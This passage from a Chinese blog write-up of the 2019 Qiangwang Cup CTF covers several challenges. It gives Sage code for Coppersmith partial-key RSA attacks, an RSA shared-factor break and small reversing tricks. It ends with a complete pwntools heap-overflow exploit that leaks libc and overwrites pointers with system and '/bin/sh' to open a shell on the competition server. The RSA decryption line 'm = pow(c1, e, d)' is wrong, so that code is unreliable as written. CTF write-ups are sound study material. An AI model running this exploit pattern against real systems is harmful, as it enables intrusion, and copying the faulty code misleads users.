</code></pre><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">n=<span class="number">0x62645f7122276f971d8be2c280c50af2a4d24f64c66d887a63412eca8318139b63d3a208bea26c760f9da2a4a5532193120ef2741863e506ef56f972afbf88072de0626af4a7f119342e524c3467f2a0b593127646a08dd9edeb94772d844847a0e4adbba021ff157a1c41393840d32966ca4b425be64c5cd7be71f15f1c0c0f</span></span><br><span class="line">p=<span class="number">0xa19bcc2975554445de9f02e634661d4f6a665336a0af5c6a6f93758a8d23dfec8b258004a431974f371132c3ca7696ef00000000000000000000000000000000</span></span><br><span class="line">c=<span class="number">0x2ea82d02c8405c04606f471756806a9d17cd0d9bedc636f7d884244745e086dbef806e4cfa440780f93abb33d5d295227df4cca71783f6693a6ea7c7775188f8cd814fadaec1a67087e5b6e1d3f51985243f057f667c663f59fbf638ea745b7aa6f57deff8da242b18086c2e8dba028613f01d100269d3342f0094e9c91edd</span></span><br><span class="line">beta = <span class="number">0.5</span></span><br><span class="line">epsilon = beta^<span class="number">2</span>/<span class="number">7</span></span><br><span class="line">p_fake = p + <span class="number">0x100000000000000000000000000000000</span></span><br><span class="line">pbits = p.nbits()</span><br><span class="line">kbits = floor(n.nbits() * (beta^<span class="number">2</span> - epsilon))</span><br><span class="line">pbar = p_fake &amp; (<span class="number">2</span>^pbits<span class="number">-2</span>^kbits)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"upper %d bits (of %d bits) is given"</span> % (pbits-kbits, pbits)</span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f = x + pbar</span><br><span class="line">x0 = f.small_roots(X=<span class="number">2</span>^kbits, beta=<span class="number">0.4</span>)[<span class="number">0</span>]  <span class="comment"># find root &lt; 2^kbits with factor &gt;= n^0.4</span></span><br><span class="line"><span class="keyword">print</span> x0 + pbar</span><br></pre></td></tr></table></figure>
<p>求得p=8464128337073235841306774067889692521235027856600640285732672852346488815451647340168593969676910111879627488847926492818393003168975897246870844426887263<br>q=n/p=8163069655763991394338137148931618671791210480216681019589422494491872929647892079092083346702116373697540683755495323751341124306366881478618522649358929</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> (b, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        g, y, x = egcd(b % a, a)</span><br><span class="line">        <span class="keyword">return</span> (g, x - (b // a) * y, y)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">modinv</span><span class="params">(a, m)</span>:</span></span><br><span class="line">    g, x, y = egcd(a, m)</span><br><span class="line">    <span class="keyword">if</span> g != <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">'modular inverse does not exist'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> x % m</span><br></pre></td></tr></table></figure>
<p>d=modinv(e,(p-1)*(q-1))</p>
<p>求得d解密</p>
<p><code>d0579143a455d3b10f0c0e69ce45f26e4b39207ef640afc1bc89a3dd2797fd11990efeeeb3c9beb8780ab9e201c89aca59a82dc82d22a6832f8e12b9ae451612</code></p>
<pre><code>[++++++++++++++++]challenge 2 completed[++++++++++++++++]
[+]Generating challenge 3
[+]n=0x7792e8692d355b543bd466603bf0d63e9f80c178695c5fdf8781a7718422f3df04de72ad0d8758274108d6e5b9fae9fe548c218589da15e5bcdd3c4d64d881e0ee1437a5280b16d127b85773ee4b662d8c032ccf08bb9cd270cc03e12b8884bc22439ef833cbaffc629f1e5022fd200eb7ae459104b19efa8a1d7dfe5fcb52cdL
[+]e=3
[+]m=random.getrandbits(512)
[+]c=pow(m,e,n)=0x72920d5cc7aef95112d4800535f2e479a10d4901af657ff06dbc105ef4e9a7bec7fb86e3af7ea3e393d919ba21464f90af9781acad2c2ca8041282c7a0e03267fe62ddf57d7ace68a7f55f8aa1e45f312ea9a1cbbb5cc1a4172aec0ef12b3c853a915573864545ce9c03cb8b50bc1cb241a6221495a9d78e472afda50d9b2174L
[+]d=invmod(e,(p-1)*(q-1))
[+]d&amp;((1&lt;&lt;512)-1)=0xb51c0c25d4b249e9a2c8d3daf342136c05e3c2ab32fea94033e4cb01d553ac0770c32884556eee08d3a61cde383c2caa7ea68fb7367f88a0312e948c4c4ac293L
[-]long_to_bytes(m).encode(&apos;hex&apos;)=$  
</code></pre><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">partial_p</span><span class="params">(p0, kbits, n)</span>:</span></span><br><span class="line">    PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    nbits = n.nbits()</span><br><span class="line"></span><br><span class="line">    f = <span class="number">2</span>^kbits*x + p0</span><br><span class="line">    f = f.monic()</span><br><span class="line">    roots = f.small_roots(X=<span class="number">2</span>^(nbits//<span class="number">2</span>-kbits), beta=<span class="number">0.3</span>)  <span class="comment"># find root &lt; 2^(nbits//2-kbits) with factor &gt;= n^0.3</span></span><br><span class="line">    <span class="keyword">if</span> roots:</span><br><span class="line">        x0 = roots[<span class="number">0</span>]</span><br><span class="line">        p = gcd(<span class="number">2</span>^kbits*x0 + p0, n)</span><br><span class="line">        <span class="keyword">return</span> ZZ(p)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_p</span><span class="params">(d0, kbits, e, n)</span>:</span></span><br><span class="line">    X = var(<span class="string">'X'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> xrange(<span class="number">1</span>, e+<span class="number">1</span>):</span><br><span class="line">        results = solve_mod([e*d0*X - k*X*(n-X+<span class="number">1</span>) + k*n == X], <span class="number">2</span>^kbits)</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> results:</span><br><span class="line">            p0 = ZZ(x[<span class="number">0</span>])</span><br><span class="line">            p = partial_p(p0, kbits, n)</span><br><span class="line">            <span class="keyword">if</span> p:</span><br><span class="line">                <span class="keyword">print</span> <span class="string">"Found"</span></span><br><span class="line">                <span class="keyword">return</span> p</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"FAILED"</span></span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    n=<span class="number">0x7792e8692d355b543bd466603bf0d63e9f80c178695c5fdf8781a7718422f3df04de72ad0d8758274108d6e5b9fae9fe548c218589da15e5bcdd3c4d64d881e0ee1437a5280b16d127b85773ee4b662d8c032ccf08bb9cd270cc03e12b8884bc22439ef833cbaffc629f1e5022fd200eb7ae459104b19efa8a1d7dfe5fcb52cd</span></span><br><span class="line">    e = <span class="number">3</span></span><br><span class="line">    d=<span class="number">0xb51c0c25d4b249e9a2c8d3daf342136c05e3c2ab32fea94033e4cb01d553ac0770c32884556eee08d3a61cde383c2caa7ea68fb7367f88a0312e948c4c4ac293</span></span><br><span class="line">    beta = <span class="number">0.5</span></span><br><span class="line">    epsilon = beta^<span class="number">2</span>/<span class="number">7</span></span><br><span class="line"></span><br><span class="line">    nbits = n.nbits()</span><br><span class="line">    kbits = floor(nbits*(beta^<span class="number">2</span>+epsilon))</span><br><span class="line">    d0 = d &amp; (<span class="number">2</span>^kbits<span class="number">-1</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"lower %d bits (of %d bits) is given"</span> % (kbits, nbits)</span><br><span class="line"></span><br><span class="line">    p = find_p(d0, kbits, e, n)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"found p: %d"</span> % p</span><br><span class="line">    q = n//p</span><br><span class="line">    <span class="keyword">print</span> d</span><br><span class="line">    <span class="keyword">print</span> inverse_mod(e, (p<span class="number">-1</span>)*(q<span class="number">-1</span>))</span><br></pre></td></tr></table></figure>
<p>后面不会了, 鸽了</p>
<hr>
<p>贴一个Chamd5的wp: <a href="https://mp.weixin.qq.com/s/Rcm4qaELX0wl8IULApujuw">https://mp.weixin.qq.com/s/Rcm4qaELX0wl8IULApujuw</a></p>
<h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><p>flag{welcome_to_qwb_2019}</p>
<h3 id="鲲or鳗orGame"><a href="#鲲or鳗orGame" class="headerlink" title="鲲or鳗orGame"></a>鲲or鳗orGame</h3><p>选游戏, js里找到<code>var romPath = &quot;rom/game.gb&quot;;</code></p>
<p>下载下来, 用GameBoy模拟器打开, 金手指启动, 把最高纪录改到<code>0xff</code>即可得到flag:</p>
<p><img src="/2019/01/18/强网杯2019/1.png" alt="img"></p>
<p>flag{PS03R49UE576R421RE8}</p>
<h3 id="强网先锋-AD"><a href="#强网先锋-AD" class="headerlink" title="强网先锋-AD"></a>强网先锋-AD</h3><p>IDA反编译以后可以看到程序读入了一段字节</p>
<p>动态调试一下, 在内存里dump出来:<br>    0072| 0x7fffffffdc28 –&gt; 0x7fffffffdc60 (“ZmxhZ3ttYWZha3VhaWxhaXFpYW5kYW9ifQ==”)</p>
<p>解base64即可:<code>flag{mafakuailaiqiandaob}</code></p>
<h3 id="强网先锋-辅助"><a href="#强网先锋-辅助" class="headerlink" title="强网先锋-辅助"></a>强网先锋-辅助</h3><p>给了两组rsa:</p>
<pre><code>c1 = 2482083893746618248544426737023750400124543452082436334398504986023501710639402060949106693279462896968839029712099336235976221571564642900240827774719199533124053953157919850838214021934907480633441577316263853011232518392904983028052155862154264401108124968404098823946691811798952747194237290581323868666637357604693015079007555594974245559555518819140844020498487432684946922741232053249894575417796067090655122702306134848220257943297645461477488086804856018323986796999103385565540496534422406390355987976815450744535949785073009043007159496929187184338592859040917546122343981520508220332785862546608841127597
e = 65537
n1 = 14967030059975114950295399874185047053736587880127990542035765201425779342430662517765063258784685868107066789475747180244711352646469776732938544641583842313791872986357504462184924075227433498631423289187988351475666785190854210389587594975456064984611990461126684301086241532915267311675164190213474245311019623654865937851653532870965423474555348239858021551589650169602439423841160698793338115204238140085738680883313433574060243600028500600824624358473403059597593891412179399165813622512901263380299561019624741488779367019389775786547292065352885007224239581776975892385364446446185642939137287519945974807727

c2 = 3829060039572042737496679186881067950328956133163629908872348108160129550437697677150599483923925798224328175594483217938833520220087230303470138525970468915511111320396185482564783975435346354440035776909781158407636044986403819840648379609630039348895415045723208843631191252142600667607807479954194447237061080618370787672720344741413537975922184859333432197766580150534457001196765621678659952108010596273244230812327182786329760844037149719587269632133595149294067490955644893402708720284179715002149224068928828656515326446881791228638008572889331511945042911372915003805505412099102954073299010951896955362470
e = 65537
n2 = 14624662628725820618622370803948630854094687814338334827462870357582795291844925274690253604919535785934208081825425541536057550227048399837243392490762167733083030368221240764693694321150104306044125934201699430146970466657410999261630825931178731857267599750324918610790098952520113593130245010530961350592735239454337631927669542026935873535964487595433984902529960726655481696404006628917922241666148082741874033756970724357470539589848548704573091633917869387239324447730587545472564561496724882799495186768858324490838169123077051890332313671220385830444331578674338014080959653201802476516237464651809255679979
</code></pre><p>题目脚本可知<br>    n1 = p1 <em> q1<br>    n2 = p2 </em> q1</p>
<p>求n1和n2的最大公约数即可分解n, 然后算私钥解密即可:</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gcd</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> a &lt; b:</span><br><span class="line">        a, b = b, a</span><br><span class="line">    <span class="keyword">while</span> b != <span class="number">0</span>:</span><br><span class="line">        temp = a % b</span><br><span class="line">        a = b</span><br><span class="line">        b = temp</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line">q1 = gcd(n1, n2)</span><br><span class="line">p1 = n1 / q1</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> (b, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        g, y, x = egcd(b % a, a)</span><br><span class="line">        <span class="keyword">return</span> (g, x - (b // a) * y, y)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">modinv</span><span class="params">(a, m)</span>:</span></span><br><span class="line">    g, x, y = egcd(a, m)</span><br><span class="line">    <span class="keyword">if</span> g != <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">'modular inverse does not exist'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> x % m</span><br><span class="line"></span><br><span class="line">d = modinv(e, (p1<span class="number">-1</span>)*(q1<span class="number">-1</span>))</span><br><span class="line">m = pow(c1, e, d)</span><br></pre></td></tr></table></figure>
<p>flag{i_am_very_sad_233333333333}</p>
<h3 id="强网先锋-AP"><a href="#强网先锋-AP" class="headerlink" title="强网先锋-AP"></a>强网先锋-AP</h3><p>修改堆块的时候没检查大小, 导致堆溢出</p>
<p>思路就是先leak libc, 然后用sh和system覆盖堆里的地址然后调用open操作即可</p>
<ol>
<li>创建4个ticket</li>
<li>修改第三个ticket, 越界写到第四个ticket的puts地址那里</li>
<li>用open操作打印ticket3, 得到puts的地址</li>
<li>得到libc版本, 找到system地址和<code>/bin/sh</code>地址</li>
<li>修改第一个ticket, 覆盖到第二个ticket的两个地址</li>
<li>调用第二个ticket的open, getshell</li>
</ol>
<p>脚本: </p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(size, context)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">"Choice &gt;&gt; \n"</span>, <span class="string">'1'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">"The length of my owner's name:\n"</span>, str(size + <span class="number">1</span>))</span><br><span class="line">    r.sendlineafter(<span class="string">"Give me my owner's name:\n"</span>, context)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">op</span><span class="params">(index)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">"Choice &gt;&gt; \n"</span>, <span class="string">'2'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">"Please tell me which tickets would you want to open?\n"</span>, str(index))</span><br><span class="line">    r.recvuntil(<span class="string">"I'm a magic tickets.I will tell you who is my owner!\n"</span>)</span><br><span class="line">    <span class="keyword">return</span> r.recvuntil(<span class="string">"\n"</span>)[:<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">(index, size, context)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">"Choice &gt;&gt; \n"</span>, <span class="string">'3'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">"Please tell me which tickets would you want to change it's owner's name?\n"</span>, str(index))</span><br><span class="line">    r.sendlineafter(<span class="string">"The length of my owner's name:\n"</span>, str(size + <span class="number">1</span>))</span><br><span class="line">    r.sendlineafter(<span class="string">"Give me my owner's name:\n"</span>, context)</span><br><span class="line"></span><br><span class="line"><span class="comment"># r = process('./task_main')</span></span><br><span class="line">r = remote(<span class="string">'49.4.66.242'</span>, <span class="number">30351</span>)</span><br><span class="line"></span><br><span class="line">get(<span class="number">8</span>, <span class="string">'a'</span> * <span class="number">8</span>)</span><br><span class="line">get(<span class="number">8</span>, <span class="string">'b'</span> * <span class="number">8</span>)</span><br><span class="line">get(<span class="number">8</span>, <span class="string">'c'</span> * <span class="number">8</span>)</span><br><span class="line">get(<span class="number">8</span>, <span class="string">'d'</span> * <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">change(<span class="number">2</span>, <span class="number">40</span>, <span class="string">'a'</span>*<span class="number">40</span>)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(op(<span class="number">2</span>)[<span class="number">40</span>:].ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line"></span><br><span class="line">info(<span class="string">"_IO_puts: "</span> + hex(puts_addr)) <span class="comment"># 0x7f7dba8c4690</span></span><br><span class="line"><span class="comment"># searcher = LibcSearcher("_IO_puts", puts_addr)</span></span><br><span class="line"><span class="comment"># libc_file = searcher.getFileName()</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># info("Libc: " + libc_file)</span></span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">"/home/a/LibcSearcher/libc-database/db/libc6_2.23-0ubuntu10_amd64.so"</span>)</span><br><span class="line">libc.address = puts_addr - libc.symbols[<span class="string">'_IO_puts'</span>]</span><br><span class="line"></span><br><span class="line">sh_addr = libc.address + <span class="number">0x000000000018cd57</span></span><br><span class="line">system_addr = libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line">info(<span class="string">"sh:   "</span> + hex(sh_addr))</span><br><span class="line">info(<span class="string">"system:   "</span> + hex(system_addr))</span><br><span class="line"></span><br><span class="line">change(<span class="number">0</span>, <span class="number">48</span>, <span class="string">'e'</span> * <span class="number">32</span> + p64(sh_addr) + p64(system_addr))</span><br><span class="line">r.sendlineafter(<span class="string">"Choice &gt;&gt; \n"</span>, <span class="string">'2'</span>)</span><br><span class="line">r.sendlineafter(<span class="string">"Please tell me which tickets would you want to open?\n"</span>, <span class="string">"1"</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

  </div>
</article>

    <div class="blog-post-comments">
        <div id="disqus_thread">
            <noscript>Please enable JavaScript to view the comments.</noscript>
        </div>
    </div>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="/tags/">tags</a></li>
         
          <li><a href="/about/">About</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#babymimic"><span class="toc-number">1.</span> <span class="toc-text">babymimic</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#justre"><span class="toc-number">2.</span> <span class="toc-text">justre</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#crypto"><span class="toc-number">3.</span> <span class="toc-text">crypto</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#签到"><span class="toc-number">4.</span> <span class="toc-text">签到</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#鲲or鳗orGame"><span class="toc-number">5.</span> <span class="toc-text">鲲or鳗orGame</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#强网先锋-AD"><span class="toc-number">6.</span> <span class="toc-text">强网先锋-AD</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#强网先锋-辅助"><span class="toc-number">7.</span> <span class="toc-text">强网先锋-辅助</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#强网先锋-AP"><span class="toc-number">8.</span> <span class="toc-text">强网先锋-AP</span></a></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://1nv0k3r.me/2019/01/18/强网杯2019/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://1nv0k3r.me/2019/01/18/强网杯2019/&text=强网杯2019"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://1nv0k3r.me/2019/01/18/强网杯2019/&title=强网杯2019"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://1nv0k3r.me/2019/01/18/强网杯2019/&is_video=false&description=强网杯2019"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=强网杯2019&body=Check out this article: http://1nv0k3r.me/2019/01/18/强网杯2019/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://1nv0k3r.me/2019/01/18/强网杯2019/&title=强网杯2019"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://1nv0k3r.me/2019/01/18/强网杯2019/&title=强网杯2019"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://1nv0k3r.me/2019/01/18/强网杯2019/&title=强网杯2019"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://1nv0k3r.me/2019/01/18/强网杯2019/&title=强网杯2019"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://1nv0k3r.me/2019/01/18/强网杯2019/&name=强网杯2019&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy; 2021 1nv0k3r
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="/tags/">tags</a></li>
         
          <li><a href="/about/">About</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

    </div>
</body>
</html>
<!-- styles -->
<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">

<!-- jquery -->
<script src="/lib/jquery/jquery.min.js"></script>
<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
<script src="/js/main.js"></script>
<!-- search -->

<!-- Google Analytics -->

    <script type="text/javascript">
        (function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
        ga('create', 'UA-131778492-1', 'auto');
        ga('send', 'pageview');
    </script>

<!-- Baidu Analytics -->

    <script type="text/javascript">
        var _hmt = _hmt || [];
        (function() {
            var hm = document.createElement("script");
            hm.src = "https://hm.baidu.com/hm.js?da32760b25f029bfe0c4abfc646f5f7a";
            var s = document.getElementsByTagName("script")[0];
            s.parentNode.insertBefore(hm, s);
        })();
    </script>

<!-- Disqus Comments -->

    <script type="text/javascript">
        var disqus_shortname = 'blog-tw5j2p4htr';

        (function(){
            var dsq = document.createElement('script');
            dsq.type = 'text/javascript';
            dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        }());
    </script>


